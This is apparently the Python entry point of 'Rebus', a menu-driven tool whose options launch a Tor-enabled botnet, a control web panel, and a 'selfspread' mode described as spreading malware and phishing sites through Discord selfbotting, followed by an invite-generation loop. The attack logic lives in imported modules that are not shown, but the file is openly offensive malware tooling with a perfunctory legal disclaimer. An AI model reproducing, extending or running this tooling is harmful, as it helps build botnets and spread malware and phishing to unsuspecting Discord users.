import time as t
import time
import os
import sys
from colorama import Fore
import socket
import threading
import datetime
import random 
import string
import requests

#---Module imports---#

from modules.botnet.botnet import *
from modules.webpanel.server import *
from modules.selfspread.InviteGen import *
from modules.commun.plugins.settings import *

try:
    #---Rebus CLI---#
    

    class cli:
        def clii():
            cls()
            setTitle("Rebus 1.0 | Star me on github ! | im not gay but $20 is $20. ")
            spinner()
            cls()
            print("""\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠃⠀⠀⠀⠀⠀⠀⠰⣶⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⣴⠇⠀⠀⠀⠀⠸⣦⠈⢿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⢸⡏⢰⡇⠀⠀⢸⡆⢸⡆⢸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⠘⣧⡈⠃⢰⡆⠘⢁⣼⠁⣸⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣄⠘⠃⠀⢸⡇⠀⠘⠁⣰⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠃⠀⠀⢸⡇⠀⠀⠘⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠃⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢸⣿⣟⠉⢻⡟⠉⢻⡟⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⢸⣿⣿⣷⣿⣿⣶⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⠈⠉⠉⢉⣉⣉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣉⣉⡉⠉⠉⠁⠀
⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠀\n""")
            print("\nMade by Z3N aka zen and this tool is free so if anyone tries to sell you it is a scam.\n\nUsage of Rebus or any of its varites for attacking targets without prior mutual consent is illegal.\nIt is the end user's responsibility to obey all applicable local, state and federal laws.\nDevelopers assume no liability and are not responsible for any misuse or damage caused by this program\n")
            while True:
                option = input("root@127.0.0.1~# ")
                if option =='help':
                    print("\n'help' Shows this text\n'botnet' sets up a botnet with tor enabled.\n'webpanel' Starts up the webpanel on '127.0.0.1'\n'selfspread' Spreads malware/phishing sites")
                elif option =='botnet':
                    setTitle("RebusNet 1.0 | Star me on github | I get nervous around women </3")
                    rebusnet.main()
                elif option =='webpanel':
                    print("Attempting to start webpanel (Version: 1.0)")
                    setTitle("RebusPanel 1.0 | Star me on github | Ion need friends i have fortnite :)")
                    RebusPanel.main()
                elif option =='selfspread':
                    print("Self Spread Malware Via Discord SelfBotting... ")
                    setTitle("RebusSpread 1.0 | Star me on github | Catboys OP ")
                    try:
                        colors = input("Do you want to have colored lines ? y/n ")
                        if colors == "y" :
                            colors = True
                        else :
                            colors = False

                        banner(colors)

                        if colors == True :
                            show_timeout = input(bcolors.WARNING + "Show a message when sleeping after the requests limit ? y/n ")
                        else :
                            show_timeout = input("Show a message when sleeping after the requests limit ? y/n ")
                        if show_timeout == "y" :
                            show_timeout = True
                        else :
                            show_timeout = False

                        show_bad = input("Show a message when an invalid discord invite is found ? y/n ")
                        if show_bad == "y" :
                            show_bad = True
                        else :
                            show_bad = False

                        write_bad = input("Write the bad invites into bad.txt ? y/n ")
                        if write_bad == "y" :
                            write_bad = True
                        else :
                            write_bad = False

                        if colors == True :
                            enter = input(bcolors.OKGREEN + "Press [ENTER] to start the generation...")
                        else :
                            enter = input("Press [ENTER] to start the generation...")
                        print("Starting in 5 sec...")
                        if colors == True :
                            print("Press CTRL+C to stop" + bcolors.ENDC)
                        else :
                            print("Press CTRL+C to stop")
                        time.sleep(5)
                        today = datetime.datetime.now()
                        today = str(today)
                        today = today.replace(":", "-")
                        today = today.replace(" ", "_")
                        os.system("mkdir "+today)
                        generation(today, show_bad, write_bad, show_timeout, colors)
                    except KeyboardInterrupt:
                        print(" ")
                        if colors == True :
                            print(bcolors.WARNING + "Keyboard Interrupt detected !")
                            print("See you next time !" + bcolors.ENDC)
                        else :
                            print("Keyboard Interrupt detected !")
                            print("See you next time !")
                        os.system("pause")
    #---Start of Rebus---#
    
    def startup():
        cli.clii()

    #---Start of the code---#
    if __name__ =="__main__":
        startup()

#---KeyboardInterrupt handling---#       
except KeyboardInterrupt:
    print("\nExiting!!!\n")
    print("\nPS: While we close stuff down, you lowkey should star Rebus on github !..\n")
    t.sleep(0.9)
    sys.exit()